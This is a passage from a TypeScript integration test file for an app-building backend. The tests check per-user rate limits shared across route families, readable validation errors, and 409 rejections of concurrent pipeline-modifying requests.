 * above and the spec-edit-family test below).
 */
test("POST .../from-template and POST .../clone share one per-user rate limit: the 31st project-creation call across both routes is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "rate-limit-project-creation@example.com");
    const sourceRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project: source } = (await sourceRes.json()) as { project: { id: string } };

    for (let i = 0; i < 30; i++) {
      const res =
        i % 2 === 0
          ? await fetch(`${baseUrl}/api/projects/from-template`, {
              method: "POST",
              headers: authHeaders(token),
              body: JSON.stringify({ templateId: "crm" }),
            })
          : await fetch(`${baseUrl}/api/projects/${source.id}/clone`, { method: "POST", headers: authHeaders(token) });
      assert.notEqual(res.status, 429, `project-creation call ${i + 1} of 30 (within the shared limit) must not be rate-limited yet`);
    }

    // The 31st call across the SAME budget, on the OTHER of the two
    // routes -- proves this is one shared counter, not two independent ones.
    const blocked = await fetch(`${baseUrl}/api/projects/${source.id}/clone`, { method: "POST", headers: authHeaders(token) });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account.
    const otherToken = await signup(baseUrl, "rate-limit-project-creation-other@example.com");
    const otherRes = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ templateId: "crm" }),
    });
    assert.notEqual(otherRes.status, 429, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Round 1109: the entire pre-build spec-editing route family (add/remove/
 * rename an entity or field, roles/assumptions/personas) had NO volumetric
 * throttle at all, unlike every other repeatable, server-cost-bearing
 * route family in this router (aiGenerationRateLimiter, whatsappRateLimiter,
 * inviteCollaboratorRateLimiter, expensiveReadRateLimiter,
 * fileUploadRateLimiter, entityCountsRateLimiter) -- each call is a
 * synchronous read-project.spec-then-write-it-back round trip with no cap
 * on spec size, so any signed-up account could script a tight loop
 * against their own never-built project, each call's cost growing with
 * the spec's own size. Cycles across two representative routes from the
 * family (POST .../roles and PATCH .../entities/:entityName/label) to
 * prove the shared budget spans the whole family, not just one route.
 */
test("POST .../roles and PATCH .../entities/:entityName/label share one per-user spec-edit rate limit: the 61st call across both routes is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "rate-limit-spec-edit@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    for (let i = 0; i < 60; i++) {
      const res =
        i % 2 === 0
          ? await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
              method: "POST",
              headers: authHeaders(token),
              body: JSON.stringify({ role: `Role ${i}` }),
            })
          : await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/label`, {
              method: "PATCH",
              headers: authHeaders(token),
              body: JSON.stringify({ label: `Label ${i}` }),
            });
      assert.notEqual(res.status, 429, `call ${i + 1} of 60 (within the shared limit) must not be rate-limited yet`);
    }

    // The 61st call across the SAME budget, on the OTHER of the two routes
    // -- proves this is one shared counter across the whole family, not an
    // independent one per route.
    const blocked = await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ role: "One role too many" }),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account.
    const otherToken = await signup(baseUrl, "rate-limit-spec-edit-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ description: "A separate, unrelated project." }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/roles`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ role: "A fresh role" }),
    });
    assert.equal(otherRes.status, 200, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Round 1110: record create/update/delete (the single most frequent write
 * in the app, per round 594's own doc comment) had NO volumetric throttle
 * at all, unlike every other repeatable, server-cost-bearing route family
 * in this router. Cycles across POST (create) and PATCH (update) to reach
 * the shared budget, then proves DELETE shares the SAME counter -- all
 * three routes are one real question ("how much record-write work can
 * this account trigger"), not three independent ones.
 */
test("record create/update/delete share one per-user rate limit: the 501st call across all three routes is rejected with 429, while a different account is unaffected", async () => {
  // Builds a request body that satisfies every required field on the
  // entity, whatever the heuristic/AI spec provider actually generated
  // for it (its exact fields and enum option names are an implementation
  // detail of that provider, not something this test should hardcode).
  const minimalRecordBody = (fields: { name: string; type: string; required: boolean; enumValues?: string[] }[]) => {
    const body: Record<string, unknown> = {};
    for (const field of fields) {
      if (!field.required) continue;
      switch (field.type) {
        case "number":
          body[field.name] = 1;
          break;
        case "boolean":
          body[field.name] = false;
          break;
        case "enum":
          body[field.name] = field.enumValues?.[0] ?? "";
          break;
        case "date":
          body[field.name] = "2024-01-01";
          break;
        default:
          body[field.name] = "Record under test";
      }
    }
    return body;
  };

  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "rate-limit-record-write@example.com");
    const createProjectRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createProjectRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);
    const builtRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: builtProject } = (await builtRes.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; type: string; required: boolean; enumValues?: string[] }[] }[] } };
    };
    const entity = builtProject.spec.entities[0];

    // Call 1 of the shared budget: create the one record every subsequent
    // update in this test targets.
    const firstCreateRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entity.name}`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify(minimalRecordBody(entity.fields)),
    });
    assert.notEqual(firstCreateRes.status, 429, "call 1 of 500 (within the shared limit) must not be rate-limited yet");
    const { record } = (await firstCreateRes.json()) as { record: { id: number } };

    // Calls 2-500: update that same record repeatedly.
    for (let i = 0; i < 499; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entity.name}/${record.id}`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify(minimalRecordBody(entity.fields)),
      });
      assert.notEqual(res.status, 429, `call ${i + 2} of 500 (within the shared limit) must not be rate-limited yet`);
    }

    // The 501st call across the SAME budget, on DELETE -- the third route
    // in the family -- proves this is one shared counter across all three
    // routes, not an independent one per route.
    const blocked = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entity.name}/${record.id}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account.
    const otherToken = await signup(baseUrl, "rate-limit-record-write-other@example.com");
    const otherCreateProjectRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ description: "A separate, unrelated project." }),
    });
    const { project: otherProject } = (await otherCreateProjectRes.json()) as { project: { id: string } };
    const otherBuildRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/build`, { method: "POST", headers: authHeaders(otherToken) });
    await collectSSE(otherBuildRes);
    const otherBuiltRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}`, { headers: authHeaders(otherToken) });
    const { project: otherBuiltProject } = (await otherBuiltRes.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; type: string; required: boolean; enumValues?: string[] }[] }[] } };
    };
    const otherEntity = otherBuiltProject.spec.entities[0];
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/entities/${otherEntity.name}`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify(minimalRecordBody(otherEntity.fields)),
    });
    assert.equal(otherRes.status, 201, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Round 1143: Time Machine's own checkpoint list/restore/rename/delete
 * routes had NO volumetric throttle at all, unlike every other repeatable,
 * server-cost-bearing route family in this router -- restore in particular
 * runs a full diffAndMigrate schema diff plus hazard analysis on every
 * call. Cycles across GET (list) and PATCH (rename) to reach the shared
 * budget, then proves POST .../restore shares the SAME counter -- all four
 * routes are one real question ("how much checkpoint-handling work can
 * this account trigger"), not four independent ones.
 */
test("checkpoint list/restore/rename/delete share one per-user rate limit: the 61st call across the family is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "rate-limit-checkpoint@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);
    const checkpointsRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints } = (await checkpointsRes.json()) as { checkpoints: { id: string }[] };
    const checkpointId = checkpoints[0].id;

    // Call 1 of the shared budget was the GET just above. Calls 2-60:
    // alternate GET (list) and PATCH (rename).
    for (let i = 0; i < 59; i++) {
      const res =
        i % 2 === 0
          ? await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) })
          : await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${checkpointId}`, {
              method: "PATCH",
              headers: authHeaders(token),
              body: JSON.stringify({ label: `Label ${i}` }),
            });
      assert.notEqual(res.status, 429, `call ${i + 2} of 60 (within the shared limit) must not be rate-limited yet`);
    }

    // The 61st call across the SAME budget, on POST .../restore -- a third
    // route in the family -- proves this is one shared counter across all
    // four checkpoint routes, not an independent one per route.
    const blocked = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${checkpointId}/restore`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account.
    const otherToken = await signup(baseUrl, "rate-limit-checkpoint-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ description: "A separate, unrelated project." }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/checkpoints`, { headers: authHeaders(otherToken) });
    assert.equal(otherRes.status, 200, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Round 1146: automation-rule create/update/delete had NO volumetric
 * throttle at all -- round 1143's own closing note claimed this hardening
 * series had closed "the last known un-rate-limited real-effect route
 * family" in this router, but never actually looked at this one.
 * `insertAutomationRule` is an unbounded INSERT with no row cap, and each
 * row created is a live rule that can later fire a real WhatsApp/webhook/
 * email send on every future matching trigger. Cycles PATCH (update) calls
 * to reach the shared budget after the first POST (create), then proves
 * DELETE shares the SAME counter -- all three routes are one real question
 * ("how much automation-rule-mutating work can this account trigger"), not
 * three independent ones.
 */
test("automation rule create/update/delete share one per-user rate limit: the 61st call across the family is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "rate-limit-automation@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    // Call 1 of the shared budget: create the rule.
    const ruleRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "send_whatsapp",
        toMode: "field",
        toField: "phone",
        messageTemplate: "hi",
      }),
    });
    assert.notEqual(ruleRes.status, 429, "call 1 of 60 (within the limit) must not be rate-limited yet");
    const { rule } = (await ruleRes.json()) as { rule: { id: string } };

    // Calls 2-60: repeated PATCH (toggle enabled) against the same rule.
    for (let i = 0; i < 59; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ enabled: i % 2 === 0 }),
      });
      assert.notEqual(res.status, 429, `call ${i + 2} of 60 (within the shared limit) must not be rate-limited yet`);
    }

    // The 61st call across the SAME budget, on DELETE -- a third route in
    // the family -- proves this is one shared counter across all three
    // automation-rule routes, not an independent one per route.
    const blocked = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account.
    const otherToken = await signup(baseUrl, "rate-limit-automation-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ description: "A separate, unrelated project." }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherBuildRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/build`, { method: "POST", headers: authHeaders(otherToken) });
    await collectSSE(otherBuildRes);
    const otherEntity = (await (await fetch(`${baseUrl}/api/projects/${otherProject.id}`, { headers: authHeaders(otherToken) })).json()) as {
      project: { spec: { entities: { name: string }[] } };
    };
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/entities/${otherEntity.project.spec.entities[0].name}/automations`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "+15551234567",
        messageTemplate: "hi",
      }),
    });
    assert.equal(otherRes.status, 201, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

test("a validation failure on project routes returns readable text, not Zod's raw JSON issue dump", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({}),
    });
    assert.equal(createRes.status, 400);
    const createBody = (await createRes.json()) as { error: string; code: string };
    assert.equal(createBody.code, "VALIDATION_ERROR");
    // A missing field fails Zod's own type check before the schema's custom
    // .min(1, "...") message ever runs, so this is Zod's own "Required" --
    // the important assertion is that it's short, readable text, not the
    // multi-line JSON.stringify(issues) dump the pre-fix code sent.
    assert.equal(createBody.error, "Required");
    assert.ok(!createBody.error.includes("{"), `expected readable text, got a JSON dump: ${createBody.error}`);

    const enhanceRes = await fetch(`${baseUrl}/api/ideas/enhance`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({}),
    });
    assert.equal(enhanceRes.status, 400);
    assert.equal(((await enhanceRes.json()) as { error: string }).error, "Required");
  });
});

test("WhatsApp send rejects a malformed body with 400 VALIDATION_ERROR, not a 500 from an uncaught ZodError", async () => {
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      // Not connected either, but validation runs first -- this must fail
      // as a 400 (bad request), not the 409 "not connected" case, and
      // definitely not a 500.
      const sendRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "", message: "" }),
      });
      assert.equal(sendRes.status, 400);
      const body = (await sendRes.json()) as { error: string; code: string };
      assert.equal(body.code, "VALIDATION_ERROR");
      assert.equal(body.error, "to is required; message is required");
    },
    { whatsapp: (db) => createTestWhatsAppManager(db).manager },
  );
});

/**
 * A real SpecProvider whose `generate` blocks on a manually-released gate
 * the first time it's called after `arm()`, so a test can deterministically
 * pause a request mid-flight (right after it would normally call the
 * AI/heuristic provider) and fire a second request while the first is
 * still "running" -- without relying on real timing/setTimeout races.
 *
 * Only the *first* post-arm call blocks; any later call (e.g. a second
 * concurrent request that a missing concurrency guard wrongly let through)
 * resolves immediately instead of piling onto the same gate -- otherwise,
 * with the guard genuinely missing, both calls would block on the same
 * never-released gate and the test would hang instead of failing cleanly.
 */
function createGatedProvider() {
  const inner = new HeuristicSpecProvider();
  let armed = false;
  let firstCallSeen = false;
  let markStarted = () => {};
  let startedPromise: Promise<void> = Promise.resolve();
  let release = () => {};
  let gate: Promise<void> = Promise.resolve();
  const provider: SpecProvider = {
    name: inner.name,
    async generate(description) {
      if (armed && !firstCallSeen) {
        firstCallSeen = true;
        markStarted();
        await gate;
      }
      return inner.generate(description);
    },
  };
  return {
    provider,
    arm() {
      armed = true;
      startedPromise = new Promise((resolve) => {
        markStarted = resolve;
      });
      gate = new Promise((resolve) => {
        release = resolve;
      });
    },
    waitUntilStarted: () => startedPromise,
    release: () => release(),
  };
}

test("two concurrent /refine calls on the same project: the second is rejected with 409 instead of silently racing and overwriting the first's spec", async () => {
  const gated = createGatedProvider();
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(buildRes.status, 200);
      await collectSSE(buildRes);

      // Arm the gate only now -- signup/create/build must all run at full
      // speed, only the refine call below should actually block.
      gated.arm();
      const refineAPromise = fetch(`${baseUrl}/api/projects/${project.id}/refine`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ instruction: "Also track invoices for customers." }),
      });
      // Never left as an unhandled rejection if an assertion on B throws
      // before this test ever reaches `await refineAPromise` below -- the
      // real result is still awaited and asserted on further down.
      refineAPromise.catch(() => {});
      // Waits until refine A's handler has actually reached (and is
      // blocked inside) its generateSpec call -- which, in the real route,
      // happens strictly after it registers itself as the project's
      // active pipeline. Without this wait, firing B immediately after A
      // (without awaiting A) would race the test itself.
      await gated.waitUntilStarted();

      const refineBRes = await fetch(`${baseUrl}/api/projects/${project.id}/refine`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ instruction: "Also track shipments for orders." }),
      });
      // Read (and release the gate) inside a finally: refine A's connection
      // must never be left dangling -- on the correct 409 JSON path this is
      // a no-op ordering, but if the guard were ever missing, B's response
      // would be an SSE stream instead and .json() would throw, which must
      // still release A so it can finish instead of leaking an open
      // connection into withServer's own teardown.
      let refineBBody: { code?: string } = {};
      try {
        refineBBody = (await refineBRes.json()) as { code?: string };
      } finally {
        gated.release();
      }
      assert.equal(refineBRes.status, 409);
      assert.equal(refineBBody.code, "PIPELINE_IN_PROGRESS");

      // Now confirm refine A itself completed normally -- the guard rejects
      // a second concurrent call, it doesn't wedge the first one.
      const refineARes = await refineAPromise;
      assert.equal(refineARes.status, 200);
      const refineAEvents = await collectSSE(refineARes);
      assert.ok(refineAEvents.every((e) => e.status !== "failed"));

      // And a THIRD refine, sent only after A has genuinely finished, must
      // succeed -- the guard must release the project once its pipeline is
      // done, not leave it permanently locked.
      const refineCRes = await fetch(`${baseUrl}/api/projects/${project.id}/refine`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ instruction: "Also track payments." }),
      });
      assert.equal(refineCRes.status, 200);
      await collectSSE(refineCRes);
    },
    { provider: gated.provider },
  );
});

test("two concurrent /answers calls on the same not-yet-built project: the second is rejected with 409 instead of silently racing and losing the first's answers", async () => {
  const gated = createGatedProvider();
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      // Arm only now -- project creation itself must run at full speed.
      gated.arm();
      const answersAPromise = fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ additionalRequest: "Also track invoices for customers." }),
      });
      answersAPromise.catch(() => {});
      await gated.waitUntilStarted();

      const answersBRes = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ additionalRequest: "Also track shipments for orders." }),
      });
      let answersBBody: { code?: string } = {};
      try {
        answersBBody = (await answersBRes.json()) as { code?: string };
      } finally {
        gated.release();
      }
      assert.equal(answersBRes.status, 409);
      assert.equal(answersBBody.code, "PIPELINE_IN_PROGRESS");

      const answersARes = await answersAPromise;
      assert.equal(answersARes.status, 200);

      // Released once A finishes -- a later, non-concurrent /answers call
      // must still succeed normally.
      const answersCRes = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ additionalRequest: "Also track payments." }),
      });
      assert.equal(answersCRes.status, 200);
    },
    { provider: gated.provider },
  );
});

/**
 * Regression test for a real bug: unlike /build, /refine, and /answers
 * above, the checkpoint-restore route never checked activePipelines at all
 * before this round -- it has the exact same read-project.spec-then-write-
 * it-back shape those three are guarded against, just with its own read
 * and write both synchronous (no AI call), so the actual hazard is a SLOW
 * /refine already in flight when a restore request lands: the restore
 * commits its own (older) spec, and moments later the refine's own,
 * already-in-progress write silently overwrites it right back, discarding
 * the user's restore with no error. Uses the same gated-provider harness as
 * the /refine-vs-/refine test above to force this deterministically.
 */
test("restoring a checkpoint while a refine is in flight is rejected with 409, instead of silently losing the restore once the refine completes", async () => {
  const gated = createGatedProvider();
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(buildRes.status, 200);
      await collectSSE(buildRes);

      const checkpointsRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, {
        headers: authHeaders(token),
      });
      const { checkpoints } = (await checkpointsRes.json()) as { checkpoints: { id: string }[] };
      const initialCheckpointId = checkpoints[0].id;

      // Arm the gate only now -- build (and reading checkpoints) must run at full speed.
      gated.arm();
      const refinePromise = fetch(`${baseUrl}/api/projects/${project.id}/refine`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ instruction: "Also track invoices for customers." }),
      });
      refinePromise.catch(() => {});
      await gated.waitUntilStarted();

      const restoreRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${initialCheckpointId}/restore`, {
        method: "POST",
        headers: authHeaders(token),
      });
      let restoreBody: { code?: string } = {};
      try {
        restoreBody = (await restoreRes.json()) as { code?: string };
      } finally {
        gated.release();
      }
      assert.equal(restoreRes.status, 409);
      assert.equal(restoreBody.code, "PIPELINE_IN_PROGRESS");

      const refineRes = await refinePromise;
      assert.equal(refineRes.status, 200);
      const refineEvents = await collectSSE(refineRes);
      assert.ok(refineEvents.every((e) => e.status !== "failed"));

      // Once the refine has genuinely finished, restoring the same checkpoint must succeed normally.
      const restoreAgainRes = await fetch(
        `${baseUrl}/api/projects/${project.id}/checkpoints/${initialCheckpointId}/restore`,
        { method: "POST", headers: authHeaders(token) },
      );
      assert.equal(restoreAgainRes.status, 200);
    },
    { provider: gated.provider },
  );
});

/**
 * Regression test for a real bug found by round 378's Explore survey:
 * unlike /build, /refine, /answers, and restore above, DELETE /projects/:id
 * never checked activePipelines at all before this round. A running
 * pipeline (runBuildPipeline) keeps creating entity tables and inserting
 * seed/checkpoint rows for this project id entirely independently of this
 * request, with no way to cancel it mid-flight -- deleting the project out
 * from under it doesn't stop it, it just means the pipeline's own later
 * writes either throw against a project row that's already gone (after its
 * own SSE response headers were already sent, so the client just sees that
 * stream die with no error) or, worse, successfully re-create an entity
 * table that's now permanently orphaned with no project row ever pointing
 * at it again. Uses the same gated-provider harness as the tests above to
 * force this deterministically.
 */
test("deleting a project while a refine is in flight is rejected with 409, instead of racing the in-flight pipeline", async () => {
  const gated = createGatedProvider();
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(buildRes.status, 200);
      await collectSSE(buildRes);

      // Arm the gate only now -- build must run at full speed.
      gated.arm();
      const refinePromise = fetch(`${baseUrl}/api/projects/${project.id}/refine`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ instruction: "Also track invoices for customers." }),
      });
      refinePromise.catch(() => {});
      await gated.waitUntilStarted();

      const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}`, {
        method: "DELETE",
        headers: authHeaders(token),
      });
      let deleteBody: { code?: string } = {};
      try {
        deleteBody = (await deleteRes.json()) as { code?: string };
      } finally {
        gated.release();
      }
      assert.equal(deleteRes.status, 409);
      assert.equal(deleteBody.code, "PIPELINE_IN_PROGRESS");

      const refineRes = await refinePromise;
      assert.equal(refineRes.status, 200);
      const refineEvents = await collectSSE(refineRes);
      assert.ok(refineEvents.every((e) => e.status !== "failed"));

      // The project must still genuinely exist -- the rejected delete must
      // never have gone through.
      const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
      assert.equal(getRes.status, 200);

      // Once the refine has genuinely finished, deleting the project must succeed normally.
      const deleteAgainRes = await fetch(`${baseUrl}/api/projects/${project.id}`, {
        method: "DELETE",
        headers: authHeaders(token),
      });
      assert.equal(deleteAgainRes.status, 204);
    },
    { provider: gated.provider },
  );
});

/**
 * Regression test for a real bug found by round 380's Explore survey: the
 * spec review screen's correction routes (entity/field label rename, and
 * add/remove/rename for roles and assumptions -- 8 routes total) never
 * checked activePipelines at all, despite each one having the exact same
 * read-project.spec-then-write-it-back shape /build/refine/answers/restore
 * are already guarded against. A slow /refine already in flight computes
 * its own nextSpec from the pre-rename spec and only writes it back once
 * the whole pipeline finishes -- so without this guard, renaming a field's
 * label while a refine is running gets silently reverted (or, depending on
 * timing, silently clobbers the refine's own result instead) with no error
 * to either side. Exercises just one representative route (entity-label
 * rename); the other 7 share the identical fix at the identical call site
 * shape, verified by direct code reading rather than one test apiece.
 */
test("renaming an entity's label while a refine is in flight is rejected with 409, instead of racing the in-flight pipeline's own spec write", async () => {
  const gated = createGatedProvider();
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(buildRes.status, 200);
      await collectSSE(buildRes);

      // Arm the gate only now -- build must run at full speed.
      gated.arm();
      const refinePromise = fetch(`${baseUrl}/api/projects/${project.id}/refine`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ instruction: "Also track invoices for customers." }),
      });
      refinePromise.catch(() => {});
      await gated.waitUntilStarted();

      const labelRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/label`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ label: "לקוח VIP" }),
      });
      let labelBody: { code?: string } = {};
      try {
        labelBody = (await labelRes.json()) as { code?: string };
      } finally {
        gated.release();
      }
      assert.equal(labelRes.status, 409);
      assert.equal(labelBody.code, "PIPELINE_IN_PROGRESS");

      const refineRes = await refinePromise;
      assert.equal(refineRes.status, 200);
      const refineEvents = await collectSSE(refineRes);
      assert.ok(refineEvents.every((e) => e.status !== "failed"));

      // Once the refine has genuinely finished, renaming the same label must succeed normally.
      const labelAgainRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/label`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ label: "לקוח VIP" }),
      });
      assert.equal(labelAgainRes.status, 200);
    },
